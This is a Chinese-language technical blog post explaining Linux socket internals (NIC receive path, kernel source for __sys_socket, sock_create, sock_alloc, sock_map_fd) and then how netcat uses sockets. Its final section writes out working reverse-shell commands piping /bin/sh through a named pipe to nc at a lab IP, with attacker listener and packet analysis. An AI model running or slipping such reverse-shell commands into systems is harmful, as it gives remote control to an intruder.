<p>NIC（Network Interface Card，网卡）在接收到数据包之后，首先需要将数据同步到内核中，具体流程如下：</p>
<ul>
<li>驱动在内存中分配一片缓冲区用来接收数据包，叫做 <code>sk_buffer</code></li>
<li>将上述缓冲区的地址和大小（即接收描述符），加入到 <code>RX ring buffer</code></li>
<li>驱动通知网卡有一个新的描述符</li>
<li>网卡从 <code>RX ring buffer</code> 中取出描述符，从而获知缓冲区的地址和大小</li>
<li>网卡收到新的数据包</li>
<li>网卡将新数据包通过 <code>DMA</code> 直接写到 <code>sk_buffer</code> 中<ul>
<li><code>RX ring buffer</code>：网络栈接收数据环形缓存区</li>
<li><code>DMA</code>：Direct Memory Access 直接存储器访问，外部设备不通过CPU而直接与系统内存交换数据的接口技术</li>
</ul>
</li>
</ul>
<p>这个时候，数据包已经被转移到了 <code>sk_buffer</code> 中，接着就会通过中断告诉内核有新数据进来了，内核会完成接下来的工作（内核会把工作交给 [网络协议栈] 去处理，以后慢慢看）</p>
<p><strong>Socket 底层原理</strong></p>
<p>其实 Socket 就是应用层与 TCP/IP 协议族通信的中间软件抽象层，它是一组接口：</p>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641473787712-1664608572272.png" class width="1641473787712"> 
<ul>
<li>Socket 可以大大简化“网络通信编程”，我们不需要完全掌握这种编程的各个细节，只需要使用 Socket 的接口就可以完成 Linux 传输网络数据包的各个步骤</li>
<li>使进程以“操作文件的方式”实现网络数据包的传输</li>
</ul>
<p>最后 Wireshark 抓个包：（133.server，134.client）</p>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1662438399161-1664608572267.png" class width="1662438399161">   
<ul>
<li>[NO.1~3]：三次握手（SYN：同步， ACK：确认）</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641475541309-1664608572272.png" class width="1641475541309"> 
<ul>
<li>[NO.4]：client -&gt; server，传输数据（PSH：传输）</li>
<li>[NO.5~8]：四次释放（FIN：结束）</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641475703919-1664608572267.png" class width="1641475703919"> 
<ul>
<li>可以发现 client 的端口是系统分配的，而 server 的端口是我们在 <code>bind</code> 中指定的</li>
</ul>
<p><strong>Linux 端口和进程的关系</strong></p>
<p>会看 client 和 server 的运行逻辑：</p>
<ul>
<li>server 监听自己系统上的一个固定端口</li>
<li>client 尝试连接 server 上的那个固定端口</li>
</ul>
<p>client 和 server 本质上是运行在 shell 上的两个进程，那它们是怎么通过端口建立联系的呢？</p>
<ul>
<li>端口是 TCP/IP 协议中的概念，描述的是 TCP 协议上的对应的应用，可以理解为基于 TCP 的系统服务，或者说系统进程（只要把某个进程运行在端口上，它就成为了 TCP 协议上的对应的应用）</li>
<li>对于每个进程，内核中都有一个表，保存了该进程申请并占用的所有 socket 描述符，在进程看来（socket 其实跟文件也没有什么不同，只不过通过描述符获得的对象不同而已，接口对应的系统调用也不同）</li>
<li>server 监听一个端口，client 连接一个端口，内核就可以通过端口快速查找并确定需要处理的进程，这两个进程就通过 TCP 协议关联起来了</li>
</ul>
<p>当 client 通过 socket 描述符向 server 发送数据后，底层的 “网卡，内核，网络协议栈” 就会用预设的方案来处理数据包，并且把数据存储到 <code>sk_buffer</code> 中</p>
<p>然后 server 就可以通过读文件的方式，把 <code>sk_buffer</code> 中的数据 <code>read/recv</code> 到本地空间中</p>
<p><strong>socket 在 Linux 中的实现</strong></p>
<p>socket 在内核中的实现分为两层：</p>
<ul>
<li>BSD socket</li>
<li>inet socket</li>
</ul>
<p>socket 在内核中对应的函数就是 <code>__sys_socket</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __sys_socket(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the SOCK_* constants for consistency.  */</span></span><br><span class="line">	BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC);</span><br><span class="line">	BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK);</span><br><span class="line">	BUILD_BUG_ON(SOCK_CLOEXEC &amp; SOCK_TYPE_MASK);</span><br><span class="line">	BUILD_BUG_ON(SOCK_NONBLOCK &amp; SOCK_TYPE_MASK);</span><br><span class="line"></span><br><span class="line">	flags = type &amp; ~SOCK_TYPE_MASK;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	type &amp;= SOCK_TYPE_MASK;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCK_NONBLOCK != O_NONBLOCK &amp;&amp; (flags &amp; SOCK_NONBLOCK))</span><br><span class="line">		flags = (flags &amp; ~SOCK_NONBLOCK) | O_NONBLOCK;</span><br><span class="line"></span><br><span class="line">	retval = sock_create(family, type, protocol, &amp;sock); <span class="comment">/* 创建一个struct socket */</span></span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock_map_fd(sock, flags &amp; (O_CLOEXEC | O_NONBLOCK)); <span class="comment">/* 把它&quot;映射&quot;到vfs中便于应用层操作 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__sys_socket</code> 在简单检查了一下标志位后，执行两个核心函数：<code>sock_create</code> 和 <code>sock_map_fd</code></li>
<li>在分析 <code>__sock_create</code> 之前，先看一下 <code>struct socket</code> 的条目信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">	socket_state		state; <span class="comment">/* socket状态 */</span></span><br><span class="line">	<span class="keyword">short</span>			type; <span class="comment">/* socket类型 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* socket标志位 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket_wq</span>	*<span class="title">wq</span>;</span> <span class="comment">/* socket等待队列 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span>		*<span class="title">file</span>;</span> <span class="comment">/* gc文件的返回指针 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		*<span class="title">sk</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>	*<span class="title">ops</span>;</span> <span class="comment">/* 根据协议类型,保存了每种协议对应的函数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sock_create</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_create</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, struct socket **res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __sock_create(current-&gt;nsproxy-&gt;net_ns, family, type, protocol, res, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_create);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __sock_create(struct net *net, <span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol,</span><br><span class="line">			 struct socket **res, <span class="keyword">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *      Check protocol is in range</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (family &lt; <span class="number">0</span> || family &gt;= NPROTO)</span><br><span class="line">		<span class="keyword">return</span> -EAFNOSUPPORT;</span><br><span class="line">	<span class="keyword">if</span> (type &lt; <span class="number">0</span> || type &gt;= SOCK_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Compatibility.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	   This uglymoron is moved from INET layer to here to avoid</span></span><br><span class="line"><span class="comment">	   deadlock in module load.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (family == PF_INET &amp;&amp; type == SOCK_PACKET) &#123;</span><br><span class="line">		pr_info_once(<span class="string">&quot;%s uses obsolete (PF_INET,SOCK_PACKET)\n&quot;</span>,</span><br><span class="line">			     current-&gt;comm);</span><br><span class="line">		family = PF_PACKET;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_socket_create(family, type, protocol, kern); <span class="comment">/* 于在创建新socket之前的权限检查,并考虑协议集,类型,协议,以及socket是在内核中创建还是在用户空间中创建 */</span></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *	Allocate the socket and allow the family to set things up. if</span></span><br><span class="line"><span class="comment">	 *	the protocol is 0, the family is instructed to select an appropriate</span></span><br><span class="line"><span class="comment">	 *	default.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sock = sock_alloc(); <span class="comment">/* struct socket的核心创建函数 */</span></span><br><span class="line">	<span class="keyword">if</span> (!sock) &#123;</span><br><span class="line">		net_warn_ratelimited(<span class="string">&quot;socket: no more sockets\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> -ENFILE;	<span class="comment">/* Not exactly a match, but its the</span></span><br><span class="line"><span class="comment">				   closest posix thing */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sock-&gt;type = type; <span class="comment">/* 设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">	<span class="comment">/* Attempt to load a protocol module if the find failed.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 12/09/1996 Marcin: But! this makes REALLY only sense, if the user</span></span><br><span class="line"><span class="comment">	 * requested real, full-featured networking support upon configuration.</span></span><br><span class="line"><span class="comment">	 * Otherwise module support will break!</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (rcu_access_pointer(net_families[family]) == <span class="literal">NULL</span>) <span class="comment">/* 检查驱动程序是否安装 */</span></span><br><span class="line">		request_module(<span class="string">&quot;net-pf-%d&quot;</span>, family); <span class="comment">/* 对未安装的驱动程序进行安装 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock(); <span class="comment">/* RCU读锁申请 */</span></span><br><span class="line">	pf = rcu_dereference(net_families[family]); <span class="comment">/* 获取受保护的RCU指针(这里是地址协议簇指针net_proto_family) */</span></span><br><span class="line">	err = -EAFNOSUPPORT;</span><br><span class="line">	<span class="keyword">if</span> (!pf)</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment">	 * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">	rcu_read_unlock(); <span class="comment">/* RCU读锁释放 */</span></span><br><span class="line"></span><br><span class="line">	err = pf-&gt;create(net, sock, protocol, kern); <span class="comment">/* 进入inet socket层 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_module_put;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now to bump the refcnt of the [loadable] module that owns this</span></span><br><span class="line"><span class="comment">	 * socket at sock_release time we decrement its refcnt.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(sock-&gt;ops-&gt;owner))</span><br><span class="line">		<span class="keyword">goto</span> out_module_busy;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now that we&#x27;re done with the -&gt;create function, the [loadable]</span></span><br><span class="line"><span class="comment">	 * module can have its refcnt decremented</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	module_put(pf-&gt;owner);</span><br><span class="line">	err = security_socket_post_create(sock, family, type, protocol, kern);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_sock_release;</span><br><span class="line">	*res = sock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_module_busy:</span><br><span class="line">	err = -EAFNOSUPPORT;</span><br><span class="line">out_module_put:</span><br><span class="line">	sock-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	module_put(pf-&gt;owner);</span><br><span class="line">out_sock_release:</span><br><span class="line">	sock_release(sock);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_release:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">goto</span> out_sock_release;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__sock_create);</span><br></pre></td></tr></table></figure>
<ul>
<li>检查标志位后，调用 <code>security_socket_create</code> 获取必要的信息</li>
<li>然后调用核心函数 <code>sock_alloc</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct socket *<span class="title">sock_alloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">	inode = new_inode_pseudo(sock_mnt-&gt;mnt_sb); <span class="comment">/* 为给定的超级块分配一个新的inode(new_inode底层也是调用这个函数) */</span></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	sock = SOCKET_I(inode); <span class="comment">/* 将inode和socket关联起来 */</span></span><br><span class="line"></span><br><span class="line">	inode-&gt;i_ino = get_next_ino(); <span class="comment">/* 对目标inode进行设置 */</span></span><br><span class="line">	inode-&gt;i_mode = S_IFSOCK | S_IRWXUGO;</span><br><span class="line">	inode-&gt;i_uid = current_fsuid();</span><br><span class="line">	inode-&gt;i_gid = current_fsgid();</span><br><span class="line">	inode-&gt;i_op = &amp;sockfs_inode_ops;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_alloc);</span><br></pre></td></tr></table></figure>
<ul>
<li>然后获取地址协议簇指针 <code>net_proto_family</code>（每种网域，都有一个 <code>net_proto_family</code> 数据结构）<ul>
<li>在系统初始化或者安装该模块时，会把指向相应网域的这个数据结构指针 <code>net_proto_family</code> 填入一个数组 <code>net_families[]</code> 中</li>
<li>每当要创建对应网域的对应协议对象实体时，就要根据传入的 <code>family</code> 参数（其实就是 <code>socket</code> 的第一个参数）去这个数组找，找到的话就调用对应的 <code>create</code> 函数 </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">unix_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_UNIX,</span><br><span class="line">	.create = unix_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_UNIX,本地通信 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_INET,</span><br><span class="line">	.create = inet_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_INET,IPv4网络通信 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet6_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_INET6,</span><br><span class="line">	.create = inet6_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_INET6,IPv6网络通信 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>之后调用 <code>pf-&gt;create(net, sock, protocol, kern)</code>，调用对应网域的 <code>create</code> 函数，这个函数主要用于初始化 <code>struct socket-&gt;proto_ops</code> 和 <code>struct socket-&gt;sock</code></li>
</ul>
<p><code>sock_map_fd</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sock_map_fd</span><span class="params">(struct socket *sock, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">newfile</span>;</span></span><br><span class="line">	<span class="keyword">int</span> fd = get_unused_fd_flags(flags); <span class="comment">/* 申请一个fd */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fd &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">		sock_release(sock);</span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	newfile = sock_alloc_file(sock, flags, <span class="literal">NULL</span>); <span class="comment">/* 申请一个file */</span></span><br><span class="line">	<span class="keyword">if</span> (likely(!IS_ERR(newfile))) &#123;</span><br><span class="line">		fd_install(fd, newfile); <span class="comment">/* 把fd和file绑定到一起 */</span></span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	put_unused_fd(fd); <span class="comment">/* 用于将形参对应的fd在其文件系统打开文件的bitmap中清零 */</span></span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(newfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实 Socket 函数的核心就是初始化了一个 <code>struct socket</code> 并把它和 VFS 绑定到了一起</p>
<ul>
<li><code>struct socket</code> 中存储了不同网域，不同协议类型的各种处理方法</li>
<li>而 VFS 则允许用户层以处理文件的形式来操作 <code>struct socket</code></li>
</ul>
<p><strong>Socket 在 NC 中的运用</strong></p>
<p>攻击端监听端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure>
<p>受害端创建一个管道 backpipe，并将 shell 环境的输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe </span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.157.134 8888 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<ul>
<li>把 <code>/tmp/backpipe</code> 重定位为 <code>/bin/sh</code> 的标准输入</li>
<li>把 <code>192.168.157.134:8888</code> 的标准输出重定位为 <code>/tmp/backpipe</code></li>
<li>这样从攻击端标准输入的数据就会输出到 <code>/tmp/backpipe</code>，然后再输出到受害端的 <code>/bin/sh</code></li>
<li>在 shell 命令中设置的管道 “|” 会把 <code>/bin/sh</code> 的结果传输回 <code>192.168.157.134:8888</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /tmp/backpipe -&gt; /bin/sh -&gt; /tmp/backpipe -&gt; 192.168.157.134:8888 /bin/sh</span><br></pre></td></tr></table></figure>
<p>为了更好地测试数据，可以把 “|” 两边的命令交换位置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe </span><br><span class="line">nc 192.168.157.134 8888 1&gt;/tmp/backpipe | /bin/sh 0&lt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<ul>
<li>把 <code>192.168.157.134:8888</code> 的标准输出重定位为 <code>/tmp/backpipe</code></li>
<li>把 <code>/tmp/backpipe</code> 重定位为 <code>/bin/sh</code> 的标准输入</li>
<li>在 shell 命令中设置的管道 “|” 会把 <code>192.168.157.134:8888</code> 中的数据输入到 <code>/bin/sh</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /tmp/backpipe -&gt; /bin/sh </span><br></pre></td></tr></table></figure>
<p>其实就相当于如下的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.157.134 8888 | /bin/sh </span><br></pre></td></tr></table></figure>
<ul>
<li>在 shell 命令中设置的管道 “|” 会把 <code>192.168.157.134:8888</code> 中的数据输入到 <code>/bin/sh</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /bin/sh </span><br></pre></td></tr></table></figure>
<p>管道在这里的作用只是把 <code>nc 192.168.157.134 8888</code> 与 <code>/bin/sh</code> 两个进程联系起来，而不同主机之间的通信则依靠 nc 命令底层的 socket</p>
<p>接下来就用第一个示例代码进行抓包分析：</p>
<ul>
<li>当两个进程建立 TCP 连接的时候：</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663134639082-1664608572268.png" class width="1663134639082"> 
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663134671374-1664608572268.png" class width="1663134671374"> 
<ul>
<li>两边抓到的包是一样的，基础的三次握手（SYN：同步， ACK：确认）</li>
<li>当攻击端发送数据时：</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663135233085-1664608572268.png" class width="1663135233085"> 
<ul>
<li>[NO.4]：攻击端发送的数据</li>
<li>[NO.6]：受害端发送的数据</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/04/Principles%EF%BC%9Amain%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%89%8D%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
